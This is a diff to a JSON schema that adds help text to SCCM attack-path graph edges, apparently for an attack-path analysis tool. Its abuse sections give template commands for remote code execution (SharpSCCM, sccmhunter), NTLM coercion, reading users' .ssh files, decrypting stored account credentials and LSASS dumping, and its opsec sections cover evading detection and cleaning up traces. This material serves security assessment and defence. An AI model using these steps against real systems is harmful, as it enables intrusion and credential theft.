+            "content": "To execute an application on an SCCM client device from Windows, host an executable on a file share or path that is accessible from the target client device, for example using the `python3 smbserver.py <name_for_share> <local_path_to_share>` Impacket script or a file share on a distribution point.\n\nNext, execute `SharpSCCM.exe get devices -n <client_device_name> -sms <sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to connect to an SMS Provider for any site in the hierarchy, search for a client device by name, and obtain its resource ID.\n\nThen, execute `SharpSCCM.exe exec -rid <resource_id> -p <unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the application. In very large environments, it may be necessary to increase the wait time to ensure the application executes before automated cleanup using the `-w <seconds>` option.\n\nBy default, SharpSCCM will execute the application in the context of the user who is currently logged in to the client device, or the `-s` flag can be added to the command to execute the application as SYSTEM. If the UNC path of the application is set to an attacker-controlled IP address or NetBIOS name and port, that user will authenticate to the attacker server via NTLM, allowing the credentials to be cracked or relayed.\n\nTo use CMPivot, which allows read access to client devices, including their file systems, registry, users and groups, and event logs, execute `SharpSCCM.exe invoke admin-service -q <kql_query> [-r <resource_id>|-i <collection_id>]`. For example, the KQL query `\"File('C:\\Users\\*\\.ssh\\*')\"` will list files discovered in any user's `.ssh` directory, after which the `\"FileContent('<path>')\"` KQL query can be used to read a file's contents.\n\nPlease refer to the References section for additional abuse primitives, tools, and resources."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "To execute PowerShell on an SCCM client device from Linux, execute `python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to connect to an SMS Provider for any site in the hierarchy, then execute the `get_device <name>` or `get_puser <name>` command to identify the target client device's resource ID.\n\nNext, execute the `interact <resource_id>` command followed by `script <local_path_to_ps1>` to execute a PowerShell script on the client device.\n\nPlease refer to the References section for additional abuse primitives, tools, and resources."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "If possible, use the Microsoft Configuration Manager Console software in the context of an existing SCCM administrator account to execute actions that create logs that blend in with normal SCCM operations.\n\nIt is common (and recommended by Microsoft) for the directories where PowerShell scripts are executed to be allow-listed in antivirus/EDR software on client devices. In addition, SCCMHunter automatically deletes PowerShell scripts after execution.\n\nBy default, SharpSCCM hides created applications from the Configuration Manager Console and automatically deletes created objects after execution on client devices.\n\nObject creation, deletion, and CMPivot execution events are logged in diagnostic status messages in SCCM, although it is uncommon for these logs to be forwarded to a SIEM. Modify hardcoded values in offensive tooling to help avoid brittle detections based on pattern matching. Ensure that objects created manually in SCCM are deleted after use (e.g., using the SharpSCCM `remove` subcommand)."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://github.com/fortra/impacket/blob/master/examples/smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)\n- [https://github.com/Mayyhem/SharpSCCM/wiki/get#get-devices](https://github.com/Mayyhem/SharpSCCM/wiki/get#get-devices)\n- [https://github.com/Mayyhem/SharpSCCM/wiki/exec](https://github.com/Mayyhem/SharpSCCM/wiki/exec)\n- [https://github.com/Mayyhem/SharpSCCM/wiki/invoke#invoke-admin-service](https://github.com/Mayyhem/SharpSCCM/wiki/invoke#invoke-admin-service)\n- [https://github.com/garrettfoster13/sccmhunter/wiki/admin#using-the-admin-module](https://github.com/garrettfoster13/sccmhunter/wiki/admin#using-the-admin-module)\n- [https://github.com/garrettfoster13/sccmhunter/wiki/admin#script](https://github.com/garrettfoster13/sccmhunter/wiki/admin#script)\n- [https://medium.com/specter-ops-posts/further-adventures-with-cmpivot-client-coercion-38b878b740ac](https://medium.com/specter-ops-posts/further-adventures-with-cmpivot-client-coercion-38b878b740ac)\n- [https://github.com/Mayyhem/SharpSCCM/wiki/remove](https://github.com/Mayyhem/SharpSCCM/wiki/remove)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_HasCurrentUser",
-      "description": "",
-      "is_traversable": true
+      "description": "SCCM records the destination user as logged on to this device at its last report. The session may have ended since that report.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The last time this SCCM client contacted its management point (every 15 minutes by default), the target user was currently logged on to the source computer.\n\nWhen a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.\n\nAny user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.\n\nNote: A session does not guarantee credential material is present, only possible."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "If the target user has a logon session on the source computer, you may be able to recover that user's credential material or impersonate their session from the computer. This requires that you can reach the computer, that you have administrative (or SYSTEM) rights on it, and that the user has an interactive (non-network) logon session there.\n\nGiven that access, a logged-on user's credentials can typically be obtained by dumping them from the memory of the Local Security Authority process (LSASS), by stealing or impersonating the user's access token to act as them against other systems, or by capturing what the user types or copies (for example, keylogging or clipboard capture). Whether any of these succeeds depends on the user's logon type, how recently they authenticated, and the host's protections (such as LSASS protection, Credential Guard, or an EDR product). See the References tab for current techniques and tooling.\n\nThis data reflects only what was true at the time of collection, so the user may have logged off by the time you reach the computer. Because people tend to reuse the same machines for their day-to-day work, it is often worth checking more than once for the session to return."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://techcommunity.microsoft.com/blog/configurationmanagerarchive/fast-channel-for-system-management---client-notification-in-system-center-2012-c/273157](https://techcommunity.microsoft.com/blog/configurationmanagerarchive/fast-channel-for-system-management---client-notification-in-system-center-2012-c/273157)\n- [https://attack.mitre.org/tactics/TA0006/](https://attack.mitre.org/tactics/TA0006/)\n- [https://attack.mitre.org/techniques/T1003/](https://attack.mitre.org/techniques/T1003/)\n- [https://attack.mitre.org/techniques/T1134/](https://attack.mitre.org/techniques/T1134/)\n- [https://attack.mitre.org/techniques/T1056/001/](https://attack.mitre.org/techniques/T1056/001/)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_HasMember",
-      "description": "",
-      "is_traversable": false
-    },
-    {
-      "name": "SCCM_HasNetworkAccessAccount",
-      "description": "",
-      "is_traversable": true
+      "description": "The destination client device, Active Directory user, or Active Directory group belongs to the source collection.",
+      "is_traversable": false,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "This indicates that the SCCM collection contains the client device or user, and that the client device or user is a member of the collection."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no specific abuse for this edge. SCCM administrators who are assigned this collection can perform actions on client devices and users within the collection that are permitted by their assigned security roles."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "There is no specific abuse for this edge. SCCM administrators who are assigned this collection can perform actions on client devices and users within the collection that are permitted by their assigned security roles."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "There are no OPSEC considerations related to this edge."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/collections/introduction-to-collections](https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/collections/introduction-to-collections)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_HasPrimaryUser",
-      "description": "",
-      "is_traversable": true
+      "description": "SCCM associates the destination user with this device through user-device affinity. This association does not guarantee a current session.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The target user is a primary user on the source SCCM client device. In SCCM, primary users are determined by user device affinity relationships, which can be created manually by an SCCM administrator or automatically based on usage (48 hours over 30 days by default). There is a high likelihood that this user has a session on this client device.\n\nWhen a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.\n\nAny user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.\n\nNote: A session does not guarantee credential material is present, only possible."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "If the target user has a logon session on the source computer, you may be able to recover that user's credential material or impersonate their session from the computer. This requires that you can reach the computer, that you have administrative (or SYSTEM) rights on it, and that the user has an interactive (non-network) logon session there.\n\nGiven that access, a logged-on user's credentials can typically be obtained by dumping them from the memory of the Local Security Authority process (LSASS), by stealing or impersonating the user's access token to act as them against other systems, or by capturing what the user types or copies (for example, keylogging or clipboard capture). Whether any of these succeeds depends on the user's logon type, how recently they authenticated, and the host's protections (such as LSASS protection, Credential Guard, or an EDR product). See the References tab for current techniques and tooling.\n\nThis data reflects only what was true at the time of collection, so the user may have logged off by the time you reach the computer. Because people tend to reuse the same machines for their day-to-day work, it is often worth checking more than once for the session to return."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/apps/deploy-use/link-users-and-devices-with-user-device-affinity](https://learn.microsoft.com/en-us/intune/configmgr/apps/deploy-use/link-users-and-devices-with-user-device-affinity)\n- [https://attack.mitre.org/tactics/TA0006/](https://attack.mitre.org/tactics/TA0006/)\n- [https://attack.mitre.org/techniques/T1003/](https://attack.mitre.org/techniques/T1003/)\n- [https://attack.mitre.org/techniques/T1134/](https://attack.mitre.org/techniques/T1134/)\n- [https://attack.mitre.org/techniques/T1056/001/](https://attack.mitre.org/techniques/T1056/001/)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_HasStoredAccount",
-      "description": "",
-      "is_traversable": true
+      "description": "The site stores an account configuration that resolves to the destination Active Directory identity, indicating a potential credential-recovery path. The collector does not recover the password and does not guarantee that the stored credentials are valid.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "This indicates that the SCCM site stores credentials for the target account (a \"reserved\" account such as a Network Access Account, client push installation account, or task sequence account). Because SCCM must recover the plaintext of these accounts to use them, they can be decrypted by anyone able to read the site's secret policy, the site database, or the DPAPI-protected blobs on the site server."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "From a Windows machine, in the context of a client (or any account that can request policy from a management point), request and decrypt the site's stored accounts with SharpSCCM (for example, `SharpSCCM.exe get secrets`), which requests the Network Access Account policy from a management point and decrypts it locally. With administrative access to the site server or site database, the same credentials can be recovered directly from the SCCM database or the DPAPI blobs under the SCCM installation directory. Recovered credentials can then be used to authenticate elsewhere in the environment."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "From a Linux machine, request and decrypt the site's secret policy (Network Access Accounts and collection variables) from a management point with a tool such as SCCMSecrets.py, or extract the credentials from the site database directly with database access. Recovered credentials can then be used to authenticate elsewhere in the environment."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Requesting secret policy from a management point generates management point and policy request log entries, though these are diagnostic and rarely forwarded to a SIEM. Reading the site database or the site server's DPAPI blobs directly is quieter but requires prior privileged access to those systems."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/accounts](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/accounts)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://github.com/synacktiv/SCCMSecrets](https://github.com/synacktiv/SCCMSecrets)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_IsAssigned",
-      "description": "",
-      "is_traversable": false
+      "description": "The administrative user is assigned the destination security role or collection, defining its permitted actions or the resources it can manage.",
+      "is_traversable": false,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The SCCM administrative user is assigned the destination role or collection. On an administrator-to-role edge, collectionIds and securityScopeIds contain the native SCCM IDs assigned to this administrator for this exact role. The role node stores the actions the role permits. Collections determine user and device coverage; security scopes govern access to objects such as applications and scripts. An empty list means no assignments of that type were retrieved; missing properties mean detailed assignments were unavailable. Administrator-to-collection edges provide an overview and do not assign every role to that collection."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "This assignment edge is informational. Use the calculated administrator-to-device access edges to follow supported role paths. Their collectionIds identify the original assigned collections supporting that access."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "This assignment edge is informational. Use the calculated administrator-to-device access edges to follow supported role paths. Their collectionIds identify the original assigned collections supporting that access."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "There are no OPSEC considerations related to this edge."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration)\n- [https://learn.microsoft.com/en-us/intune/configmgr/develop/reference/core/servers/configure/sms_apermission-server-wmi-class](https://learn.microsoft.com/en-us/intune/configmgr/develop/reference/core/servers/configure/sms_apermission-server-wmi-class)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_IsMappedTo",
-      "description": "",
-      "is_traversable": true
+      "description": "The source Active Directory user or group corresponds to the destination SCCM administrative record and receives its assigned administrative access.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source user is mapped to the target administrative user in SCCM and can access SCCM resources based on its assigned security roles and device/user collections."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "To leverage SCCM administrative user permissions from a Windows machine, execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or leverage the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "To leverage SCCM administrative user permissions from a Linux machine, execute `python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. Proxying in SCCMHunter or the Configuration Manager Console software are less likely to be detected. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://github.com/garrettfoster13/sccmhunter/wiki](https://github.com/garrettfoster13/sccmhunter/wiki)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_OSDManager",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Operating System Deployment Manager security role over a collection containing this device, providing a code execution path through task-sequence deployment.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Operating System Deployment Manager security role and is assigned a collection containing the target client device, allowing the user to create and deploy task sequences to the device to gain remote command execution."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no public offensive tooling to abuse this edge at the time of this writing. Use the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_OperationsAdministrator",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Operations Administrator security role over a collection containing this device, providing a code execution path through permitted deployment operations.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Operations Administrator security role and is assigned a collection containing the target client device, allowing the user to execute all SCCM actions against the device. This security role has all permissions in SCCM with the exception of those required to manage security, including administrative user creation and security role, security scope, and collection assignments.\n\nControl of a client device via SCCM allows deployment of an application or package, PowerShell execution, authentication coercion, or read access to any data on the device."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "To leverage SCCM administrative user permissions from a Windows machine, execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or leverage the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy.\n\nTo execute an application on an SCCM client device from Windows, host an executable on a file share or path that is accessible from the target client device, for example using the `python3 smbserver.py <name_for_share> <local_path_to_share>` Impacket script or a file share on a distribution point.\n\nNext, execute `SharpSCCM.exe get devices -n <client_device_name> -sms <sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to connect to an SMS Provider for any site in the hierarchy, search for a client device by name, and obtain its resource ID.\n\nThen, execute `SharpSCCM.exe exec -rid <resource_id> -p <unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the application. In very large environments, it may be necessary to increase the wait time to ensure the application executes before automated cleanup using the `-w <seconds>` option.\n\nBy default, SharpSCCM will execute the application in the context of the user who is currently logged in to the client device, or the `-s` flag can be added to the command to execute the application as SYSTEM. If the UNC path of the application is set to an attacker-controlled IP address or NetBIOS name and port, that user will authenticate to the attacker server via NTLM, allowing the credentials to be cracked or relayed.\n\nTo use CMPivot, which allows read access to client devices, including their file systems, registry, users and groups, and event logs, execute `SharpSCCM.exe invoke admin-service -q <kql_query> [-r <resource_id>|-i <collection_id>]`. For example, the KQL query `\"File('C:\\Users\\*\\.ssh\\*')\"` will list files discovered in any user's `.ssh` directory, after which the `\"FileContent('<path>')\"` KQL query can be used to read a file's contents.\n\nPlease refer to the References section for additional abuse primitives, tools, and resources."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "To execute PowerShell on an SCCM client device from Linux, execute `python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to connect to an SMS Provider for any site in the hierarchy, then execute the `get_device <name>` or `get_puser <name>` command to identify the target client device's resource ID.\n\nNext, execute the `interact <resource_id>` command followed by `script <local_path_to_ps1>` to execute a PowerShell script on the client device.\n\nPlease refer to the References section for additional abuse primitives, tools, and resources."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. Proxying in SCCMHunter or the Configuration Manager Console software are less likely to be detected. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://github.com/garrettfoster13/sccmhunter/wiki](https://github.com/garrettfoster13/sccmhunter/wiki)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_AdminsReplicatedTo",
-      "description": "",
-      "is_traversable": true
+      "description": "SCCM administrative data replicates from the source site to the destination site, extending administrative access through the hierarchy.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "SCCM security roles assigned to users are replicated to every other site in the hierarchy. As a result, an administrative user created and/or granted permissions in one site will have the same permissions in every other site in the hierarchy. An attacker with control of any site gains control of every site in the hierarchy and as a result, control of every client device managed by the hierarchy."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no specific abuse required to follow this attack path. As SCCM admin users are replicated between sites in the same hierarchy by design, an admin user created in any site in the hierarchy will have the same permissions in every other site in the hierarchy.\n\nTo leverage SCCM administrative user permissions from a Windows machine, execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or leverage the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "There is no specific abuse required to follow this attack path. As SCCM admin users are replicated between sites in the same hierarchy by design, an admin user created in any site in the hierarchy will have the same permissions in every other site in the hierarchy.\n\nTo leverage SCCM administrative user permissions from a Linux machine, execute `python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to connect to an SMS Provider for any site in the hierarchy."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. Proxying in SCCMHunter or the Configuration Manager Console software are less likely to be detected. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration)\n- [https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://github.com/garrettfoster13/sccmhunter/wiki](https://github.com/garrettfoster13/sccmhunter/wiki)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-file](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-file)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_SecurityAdministrator",
-      "description": "",
-      "is_traversable": true
+      "description": "The administrative user holds all permissions granted to the Security Administrator security role over a collection containing this device, providing a code execution path by assigning itself a role that permits execution.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source SCCM administrative user is assigned the Security Administrator security role and is assigned a collection containing the target client device, allowing them to assign any security role to new or existing administrative users, limited to the collections the source user is assigned."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "There is no public offensive tooling to abuse this edge at the time of this writing. Use the Microsoft Configuration Manager Console software in the context of the admin user to connect to an SMS Provider for any site in the hierarchy or the `New-CMAdministrativeUser` Configuration Manager PowerShell cmdlet to assign a security role to a new or existing administrative user."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Use of the Configuration Manager Console software is less likely to be detected than offensive tooling. Most actions in SCCM are logged to files in C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting and it is uncommon for them to be forwarded to a SIEM. For more information, see the References tab."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles](https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     }
   ],
   "environments": [
